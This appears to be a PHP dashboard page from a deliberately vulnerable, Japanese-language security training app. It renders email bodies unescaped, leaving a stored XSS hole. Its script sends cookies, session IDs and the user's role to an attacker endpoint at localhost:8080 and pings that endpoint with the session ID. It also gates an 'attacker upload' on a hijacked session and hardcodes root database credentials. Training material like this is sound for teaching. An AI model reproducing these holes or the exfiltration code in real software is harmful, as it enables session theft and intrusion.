<?php

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}


require_once 'session_security.php';


if (empty($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}


if (empty($_SESSION['user_specific_id']) || empty($_SESSION['login_time'])) {
    session_destroy();
    header('Location: login.php?error=session_invalid');
    exit;
}


$security_check = (($_SESSION['role'] ?? '') === 'admin')
    ? updateSessionSecurity()
    : ['hijacked'=>false, 'confidence'=>0, 'reason'=>'non_admin'];


$login_method = $_SESSION['login_method'] ?? 'unknown';
$is_hijacked  = (($_SESSION['role'] ?? '') === 'admin') && ($login_method === 'hijacked');


$host = 'db';
$dbname = 'security_exercise';
$username = 'root';
$password = 'password';

try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die("データベース接続エラー: " . $e->getMessage());
}

require_once 'xss_validation.php';
$validator = new XSSRouteValidator($pdo);

$message = '';


$emails = [];
if ($_SESSION['role'] === 'admin') {
    $stmt = $pdo->prepare("SELECT * FROM emails ORDER BY created_at DESC LIMIT 10");
    $stmt->execute();
    $emails = $stmt->fetchAll();
    

    foreach ($emails as $index => $email) {

        if (preg_match('/xss_tracker\.php\?token=([a-f0-9]{64})/', $email['body'], $matches)) {
            $extractedToken = $matches[1];
            

            $_SESSION['available_xss_token'] = $extractedToken;
            

            error_log("XSS Token found in dashboard email: " . $extractedToken . " for admin: " . $_SESSION['username']);
        }
    }
}


$uploadedFiles = [];
if ($_SESSION['role'] === 'admin') {
    $stmt = $pdo->prepare("SELECT * FROM uploaded_files ORDER BY created_at DESC");
    $stmt->execute();
    $uploadedFiles = $stmt->fetchAll();
}


$login_method = $_SESSION['login_method'] ?? 'unknown';
$is_hijacked = ($login_method === 'hijacked');


$sessionDetails = [
    'session_id' => session_id(),
    'user_id' => $_SESSION['user_id'],
    'username' => $_SESSION['username'],
    'role' => $_SESSION['role'],
    'login_time' => $_SESSION['login_time'] ?? time(),
    'current_time' => time(),
    'session_duration' => time() - ($_SESSION['login_time'] ?? time()),
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    'ip_address' => $_SERVER['REMOTE_ADDR'] ?? '',
    'cookie_info' => 'PHPSESSID=' . session_id(),
    'login_method' => $login_method,
];
?>

<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ダッシュボード - ABC Corporation</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; line-height: 1.6; color: #333; background: #f8f9fa; }
        .header { background: #2c3e50; color: white; padding: 1rem 0; }
        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
        .nav { display: flex; justify-content: space-between; align-items: center; }
        .nav h1 { font-size: 1.8rem; }
        .nav ul { display: flex; list-style: none; gap: 20px; }
        .nav a { color: white; text-decoration: none; padding: 10px 15px; border-radius: 5px; transition: background 0.3s; }
        .nav a:hover { background: #34495e; }
        .main { padding: 40px 0; }
        .dashboard-header { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); margin-bottom: 30px; }
        .dashboard-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 30px; }
        .dashboard-card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
        .card-title { color: #2c3e50; margin-bottom: 20px; font-size: 1.5rem; }
        .btn { background: #667eea; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; display: inline-block; }
        .btn:hover { background: #5a67d8; }
        .btn-danger { background: #e74c3c; }
        .btn-danger:hover { background: #c0392b; }
        .btn-upload { background: #28a745; }
        .btn-upload:hover { background: #218838; }
        .message { padding: 15px; border-radius: 5px; margin-bottom: 20px; background: #d4edda; color: #155724; }
        .email-item { 
            background: #f8f9fa; 
            padding: 15px; 
            margin-bottom: 10px; 
            border-radius: 5px; 
            border-left: 4px solid #667eea; 
            cursor: pointer;
            transition: all 0.3s ease;
            border: 1px solid transparent;
        }
        .email-item:hover {
            background: #f0f0f0;
            border-color: #007bff;
        }
        .email-meta { font-size: 0.9em; color: #666; margin-bottom: 10px; }
        .email-body { 
            font-size: 0.95em; 
            display: none; 
            margin-top: 10px; 
            padding: 10px; 
            background: #fff; 
            border-radius: 3px; 
            border: 1px solid #ddd;
        }
        .email-body.active { display: block; }
        .file-item { background: #f8f9fa; padding: 10px; margin-bottom: 10px; border-radius: 5px; display: flex; justify-content: space-between; align-items: center; }
        .admin-badge { background: #e74c3c; color: white; padding: 5px 10px; border-radius: 15px; font-size: 0.8em; }
        .user-info { display: flex; align-items: center; gap: 15px; }
        .session-info { background: #e8f4f8; border: 1px solid #bee5eb; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .session-detail { font-family: monospace; font-size: 0.9em; margin: 5px 0; }
        .cookie-display { background: #f8f9fa; padding: 10px; border-radius: 3px; word-break: break-all; margin: 10px 0; font-family: monospace; border: 1px solid #ddd; }
        .security-warning { background: #fff3cd; color: #856404; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .hijacked-warning { background: #ff6b6b; color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.8; } }
        .login-method-info { background: #e9ecef; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .normal-login { background: #d4edda; color: #155724; }
        .hijacked-login { background: #f8d7da; color: #721c24; }
        .xss-attack-warning { 
            background: #fff3cd; 
            color: #856404; 
            padding: 8px; 
            border-radius: 3px; 
            margin-top: 8px; 
            font-size: 0.85em;
            border-left: 4px solid #ff6600;
        }
        .xss-attack-success {
            border: 2px solid #ff0000 !important;
            animation: pulse 2s infinite;
            background: #ffeeee !important;
        }
        .token-info {
            background: #e8f4f8;
            padding: 10px;
            border-radius: 3px;
            margin: 10px 0;
            font-family: monospace;
            font-size: 0.8em;
            color: #0066cc;
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="container">
            <nav class="nav">
                <h1>ABC Corporation</h1>
                <ul>
                    <li><a href="index.php">ホーム</a></li>
                    <li><a href="services.php">サービス</a></li>
                    <li><a href="contact.php">お問い合わせ</a></li>
                    <li><a href="dashboard.php">ダッシュボード</a></li>
                    <li><a href="logout.php">ログアウト</a></li>
                </ul>
            </nav>
        </div>
    </header>

    <main class="main">
        <div class="container">

            <?php if ($is_hijacked): ?>
                <div class="hijacked-warning">
                    <h3>⚠️ セッションハイジャック検出！</h3>
                    <p>このセッションは不正な方法で取得された可能性があります。</p>
                    <p>通常のログイン手順を経ていないセッションでアクセスしています。</p>
                </div>
            <?php endif; ?>

            <div class="dashboard-header">
                <div class="user-info">
                    <h2>ダッシュボード</h2>
                    <span>ようこそ、<?php echo htmlspecialchars($_SESSION['username']); ?>さん</span>
                    <?php if($_SESSION['role'] === 'admin'): ?>
                        <span class="admin-badge">管理者</span>
                    <?php endif; ?>
                </div>
            </div>

            <div class="login-method-info <?php echo $is_hijacked ? 'hijacked-login' : 'normal-login'; ?>">
                <h3>ログイン方法の詳細</h3>
                <p><strong>ログイン方式:</strong> 
                    <?php if ($is_hijacked): ?>
                        <span style="color: #dc3545; font-weight: bold;">セッションハイジャック検出</span>
                    <?php else: ?>
                        <span style="color: #28a745; font-weight: bold;">正規のログイン</span>
                    <?php endif; ?>
                </p>
                <p><strong>検出理由:</strong> 
                    <?php echo $is_hijacked ? 'Cookie操作またはセッション乗っ取りが検出されました' : '通常のユーザー名・パスワード認証'; ?>
                </p>
                <p><strong>セキュリティレベル:</strong> 
                    <?php echo $is_hijacked ? '高リスク' : '正常'; ?>
                </p>
            </div>

            

            <?php if ($message): ?>
                <div class="message"><?php echo htmlspecialchars($message); ?></div>
            <?php endif; ?>

            <?php if (isset($_GET['error']) && $_GET['error'] === 'hijacked_only'): ?>
                <div class="message" style="background: #fff3cd; color: #856404; border: 1px solid #ffeaa7;">
                    <strong>⚠️ アクセス拒否:</strong> この機能はセッションハイジャック検出時のみ利用可能です。<br>
                    正規ログインでは特別機能にアクセスできません。
                </div>
            <?php endif; ?>

            <div class="dashboard-grid">

                <?php if($_SESSION['role'] === 'admin'): ?>
                <div class="dashboard-card">
                    <h3 class="card-title">📁 ファイル管理</h3>
                    
                    <?php if ($is_hijacked): ?>

                        <div style="background: #2d3436; color: #00b894; padding: 15px; border-radius: 5px; margin-bottom: 15px;">
                            <h4 style="color: #ff6b6b; margin-bottom: 10px;">🚨 攻撃者専用機能</h4>
                            <p style="margin-bottom: 15px;">セッションハイジャックが検出されました。特別機能が有効化されています。</p>
                            <a href="upload.php" class="btn btn-danger">🔥 攻撃者アップロード</a>
                        </div>
                        
                        <div style="background: #f8d7da; color: #721c24; padding: 15px; border-radius: 5px; margin-bottom: 15px;">
                            <strong>⚠️ 注意:</strong> この機能は正規ログインでは利用できません。<br>
                            セッション乗っ取りによる不正アクセスが検出されたため表示されています。
                        </div>
                    <?php else: ?>

                        <p style="margin-bottom: 20px;">通常のファイル管理機能</p>
                        
                        <div style="background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; margin-bottom: 15px;">
                            <strong>✅ セキュア状態:</strong> 正規ログインが確認されています。<br>
                            特別な機能は表示されません。
                        </div>
                        
                        <button class="btn" disabled style="background: #6c757d; cursor: not-allowed;">
                            通常アップロード（開発中）
                        </button>
                        <small style="display: block; margin-top: 10px; color: #666;">
                            セキュリティ上の理由により一時停止中
                        </small>
                    <?php endif; ?>
                    
                    <h4>最近のアップロードファイル:</h4>
                    <?php if (empty($uploadedFiles)): ?>
                        <p style="color: #666;">アップロードされたファイルはありません</p>
                    <?php else: ?>
                        <?php foreach(array_slice($uploadedFiles, 0, 3) as $file): ?>
                            <div class="file-item" style="<?php echo $is_hijacked ? 'background: #f8d7da; border-left: 4px solid #dc3545;' : ''; ?>">
                                <span><?php echo $is_hijacked ? '🚨 ' : ''; ?><?php echo htmlspecialchars($file['original_name']); ?></span>
                                <span style="font-size: 0.8em; color: #666;">
                                    <?php echo $file['is_active'] ? '有効' : '無効'; ?>
                                </span>
                            </div>
                        <?php endforeach; ?>
                        <?php if (count($uploadedFiles) > 3): ?>
                            <p style="margin-top: 10px;">
                                <?php if ($is_hijacked): ?>
                                    <a href="upload.php" style="color: #dc3545;">全攻撃ファイル表示 (<?php echo count($uploadedFiles); ?>個)</a>
                                <?php else: ?>
                                    <span style="color: #666;">すべて表示 (<?php echo count($uploadedFiles); ?>個)</span>
                                <?php endif; ?>
                            </p>
                        <?php endif; ?>
                    <?php endif; ?>
                </div>

                <div class="dashboard-card">
                    <h3 class="card-title">📧 受信メール</h3>
                    <?php if(empty($emails)): ?>
                        <p style="color: #666;">受信メールはありません</p>
                        <p style="color: #999; font-size: 0.9em; margin-top: 10px;">お問い合わせフォームからメールが送信されると、ここに表示されます。</p>
                    <?php else: ?>
                        <?php foreach(array_slice($emails, 0, 3) as $index => $email): ?>
                            <div class="email-item" id="email-item-<?php echo $index; ?>" onclick="toggleEmailInDashboard(<?php echo $index; ?>)">
                                <div class="email-meta">
                                    <strong>From:</strong> <?php echo htmlspecialchars($email['from_email']); ?> | 
                                    <strong>件名:</strong> <?php echo htmlspecialchars($email['subject']); ?> | 
                                    <?php echo $email['created_at']; ?>
                                </div>
                                
                                <div class="email-body" id="email-body-<?php echo $index; ?>">

                                    <?php echo $email['body']; ?>
                                </div>
                                

                                <?php if (strpos($email['body'], '<script>') !== false || strpos($email['body'], 'onerror') !== false || strpos($email['body'], 'xss_tracker') !== false): ?>
                                    <div class="xss-attack-warning">
                                        <strong>⚠️ XSS攻撃検出:</strong> このメールには実行可能なコードが含まれています。
                                        <span style="color: #dc3545; font-weight: bold;">開封により自動実行されます。</span>
                                    </div>
                                <?php endif; ?>
                                

                                <?php if (preg_match('/xss_tracker\.php\?token=([a-f0-9]{64})/', $email['body'], $matches)): ?>
                                    <div class="token-info">
                                        XSSトークン: <?php echo substr($matches[1], 0, 16); ?>... 
                                        <small>(クリックで攻撃実行)</small>
                                    </div>
                                <?php endif; ?>
                            </div>
                        <?php endforeach; ?>
                        <?php if (count($emails) > 3): ?>
                            <p style="margin-top: 10px;"><a href="email_check.php">すべて表示 (<?php echo count($emails); ?>件)</a></p>
                        <?php endif; ?>
                    <?php endif; ?>
                </div>
                <?php endif; ?>


                <div class="dashboard-card">
                    <h3 class="card-title">👤 ユーザー情報</h3>
                    <p><strong>ユーザー名:</strong> <?php echo htmlspecialchars($_SESSION['username']); ?></p>
                    <p><strong>ユーザーID:</strong> <?php echo htmlspecialchars($_SESSION['user_id']); ?></p>
                    <p><strong>権限:</strong> <?php echo $_SESSION['role'] === 'admin' ? '管理者' : '一般ユーザー'; ?></p>
                    <p><strong>ログイン時刻:</strong> <?php echo date('Y-m-d H:i:s', $sessionDetails['login_time']); ?></p>
                    <p><strong>現在時刻:</strong> <?php echo date('Y-m-d H:i:s'); ?></p>
                    
                    <?php if ($is_hijacked): ?>
                        <div style="background: #f8d7da; color: #721c24; padding: 10px; border-radius: 5px; margin-top: 15px;">
                            <strong>⚠️ セキュリティアラート:</strong><br>
                            不正なセッションでアクセスしています
                        </div>
                    <?php endif; ?>
                </div>

                <div class="dashboard-card">
                    <h3 class="card-title">🔗 クイックリンク</h3>
                    <div style="display: flex; flex-direction: column; gap: 10px;">
                        <a href="services.php" class="btn" style="text-decoration: none; text-align: center;">サービス一覧</a>
                        <a href="contact.php" class="btn" style="text-decoration: none; text-align: center;">お問い合わせ</a>
                        
                        <?php if($_SESSION['role'] === 'admin'): ?>
                            <a href="email_check.php" class="btn" style="text-decoration: none; text-align: center;">メール確認</a>
                            
                            <?php if ($is_hijacked): ?>

                                <a href="upload.php" class="btn btn-danger" style="text-decoration: none; text-align: center;">🚨 攻撃者アップロード</a>
                                <div style="background: #2d3436; color: #00b894; padding: 10px; border-radius: 3px; text-align: center; font-size: 0.8em;">
                                    ハイジャック権限で有効化
                                </div>
                            <?php else: ?>

                                <button class="btn" disabled style="background: #6c757d; cursor: not-allowed;">アップロード（無効）</button>
                                <small style="color: #666; text-align: center; display: block; margin-top: 5px;">
                                    正規ログインでは利用不可
                                </small>
                            <?php endif; ?>
                        <?php endif; ?>
                        
                        
                    </div>
                </div>
            </div>
        </div>
    </main>

    <script>

        function toggleEmailInDashboard(index) {
            const emailBody = document.getElementById('email-body-' + index);
            const emailItem = document.getElementById('email-item-' + index);
            
            if (!emailBody.classList.contains('active')) {

                document.querySelectorAll('.email-body').forEach(body => {
                    body.classList.remove('active');
                });
                document.querySelectorAll('.email-item').forEach(item => {
                    item.classList.remove('xss-attack-success');
                });
                

                emailBody.classList.add('active');
                emailItem.style.background = '#f8f9fa';
                
                console.log('📧 ダッシュボードでメール開封: インデックス ' + index);
                
                const tokenMatch = emailBody.innerHTML.match(/xss_tracker\.php\?token=([a-f0-9]{64})/);
                if (tokenMatch) {
                    const token = tokenMatch[1];
                    console.log('🎯 XSS攻撃トークン発見:', token);
                    

                    fetch('xss_tracker.php?token=' + token + '&action=email_opened_dashboard', {
                        method: 'GET',
                        mode: 'no-cors'
                    }).then(() => {
                        console.log('✅ トークン記録完了');
                    });
                    

                    fetch('xss_tracker.php?token=' + token + '&action=store_token', {
                        method: 'GET',
                        mode: 'no-cors'
                    });
                    

                    setTimeout(function() {
                        console.log('🚨 XSS攻撃実行中...');
                        

                        const sessionData = {
                            cookie: document.cookie,
                            url: window.location.href,
                            user: '<?php echo $_SESSION['username']; ?>',
                            role: '<?php echo $_SESSION['role']; ?>',
                            sessionId: '<?php echo session_id(); ?>',
                            timestamp: new Date().toISOString(),
                            source: 'dashboard_email_opened',
                            token: token,
                            attack_vector: 'legitimate_xss'
                        };
                        
                        const attackerUrl = 'http://localhost:8080?' + Object.keys(sessionData).map(key => 
                            key + '=' + encodeURIComponent(sessionData[key])
                        ).join('&');
                        

                        fetch(attackerUrl, {
                            method: 'GET',
                            mode: 'no-cors'
                        }).then(() => {
                            console.log('✅ 正規XSS攻撃でセッション情報送信完了');
                            

                            fetch('xss_tracker.php?action=trigger_hijack&token=' + token, {
                                method: 'GET',
                                mode: 'no-cors'
                            });
                        });
                        

                        emailItem.classList.add('xss-attack-success');
                        

                        console.log('%c🎯 XSS攻撃成功！セッション情報が窃取されました', 'color: #ff0000; font-weight: bold; font-size: 14px; background: #ffeeee; padding: 5px;');
                        console.log('攻撃トークン:', token);
                        console.log('窃取されたセッション:', document.cookie);
                        
                    }, 2000);
                }
            } else {
                emailBody.classList.remove('active');
                emailItem.style.background = '';
                emailItem.classList.remove('xss-attack-success');
            }
        }


        window.addEventListener('load', function() {
            console.log('=== ダッシュボード XSS攻撃監視開始 ===');
            

            const emailBodies = document.querySelectorAll('[id^="email-body-"]');
            let foundTokens = [];
            
            emailBodies.forEach(function(emailBody) {
                const tokenMatch = emailBody.innerHTML.match(/xss_tracker\.php\?token=([a-f0-9]{64})/);
                if (tokenMatch) {
                    const token = tokenMatch[1];
                    foundTokens.push(token);
                    console.log('待機中のXSS攻撃トークン:', token);
                }
            });
            
            if (foundTokens.length > 0) {
                console.log('🎯 ' + foundTokens.length + '個のXSS攻撃が待機中です');
                console.log('メールを開封すると攻撃が実行されます');
                

                const latestToken = foundTokens[foundTokens.length - 1];
                fetch('xss_tracker.php?token=' + latestToken + '&action=auto_register', {
                    method: 'GET',
                    mode: 'no-cors'
                });
            }
            
            console.log('=====================================');
        });


        console.log('=== セッション情報 (セキュリティ演習用) ===');
        console.log('セッションID:', '<?php echo $sessionDetails['session_id']; ?>');
        console.log('ユーザー名:', '<?php echo $sessionDetails['username']; ?>');
        console.log('権限:', '<?php echo $sessionDetails['role']; ?>');
        console.log('ログイン方法:', '<?php echo $sessionDetails['login_method']; ?>');
        console.log('Cookie:', '<?php echo $sessionDetails['cookie_info']; ?>');
        
        <?php if (isset($_SESSION['available_xss_token'])): ?>
        console.log('利用可能なXSSトークン:', '<?php echo $_SESSION['available_xss_token']; ?>');
        <?php endif; ?>
        
        <?php if ($is_hijacked): ?>
        console.log('ハイジャック信頼度:', '<?php echo $sessionDetails['hijack_confidence'] ?? 0; ?>%');
        console.log('検出理由:', '<?php echo $sessionDetails['hijack_reason'] ?? 'unknown'; ?>');
        <?php endif; ?>
        
        console.log('============================================');
        

        <?php if ($is_hijacked): ?>
            console.log('%c⚠️ セッションハイジャックが検出されました！', 'color: #ff0000; font-weight: bold; font-size: 14px;');
            console.log('%cこのセッションは正規の手順でログインされていません', 'color: #ff0000;');
            console.log('%c検出方法: リアルタイム分析による Cookie操作検出', 'color: #ff6600;');
            

            document.body.style.border = '3px solid #ff0000';
            document.body.style.animation = 'pulse 2s infinite';
            

            console.log('%c=== ハイジャック検出詳細 ===', 'color: #ff0000; font-weight: bold;');
            console.log('信頼度: <?php echo $sessionDetails['hijack_confidence'] ?? 0; ?>%');
            console.log('主な理由: <?php echo $sessionDetails['hijack_reason'] ?? 'unknown'; ?>');
            console.log('==========================================');
            
        <?php else: ?>
            console.log('%c✅ 正規のログインセッションです', 'color: #28a745; font-weight: bold;');
            console.log('セッション初期化フラグ:', <?php echo isset($_SESSION['session_initialized']) ? 'true' : 'false'; ?>);
        <?php endif; ?>
        
        <?php if ($_SESSION['role'] === 'admin'): ?>
        console.log('%c⚠️ 管理者権限でアクセス中', 'color: #ff6600; font-weight: bold;');
        console.log('このセッションでメールを開くと、XSS攻撃が実行される可能性があります');
        console.log('このCookieが攻撃者に盗まれると危険です！');
        <?php endif; ?>


        const urlParams = new URLSearchParams(window.location.search);
        const loginMethod = urlParams.get('method');
        if (loginMethod === 'hijacked') {
            console.log('%cセッションハイジャック経由でのアクセスが検出されました', 'background: #ff0000; color: white; padding: 5px;');
        }
        

        <?php if ($security_check['hijacked']): ?>
            console.log('%c🔥 リアルタイムハイジャック検出が作動しました', 'background: #ff0000; color: white; padding: 10px; font-size: 14px;');
            console.log('検出時刻:', new Date().toLocaleString());
            console.log('この検出は Cookie操作やセッション乗っ取りによるものです');
        <?php endif; ?>


        setInterval(function() {

            const img = new Image();
            img.src = 'http://localhost:8080?action=ping&sessionId=<?php echo session_id(); ?>&timestamp=' + Date.now();
        }, 30000);


        function showXSSWarning() {
            if ('<?php echo $_SESSION['role']; ?>' === 'admin') {
                console.log('%c🚨 XSS攻撃実行準備完了', 'background: #ff0000; color: white; padding: 10px; font-size: 16px;');
                console.log('メールを開封すると、攻撃者にセッション情報が送信されます');
            }
        }


        setTimeout(showXSSWarning, 5000);
    </script>
</body>
</html>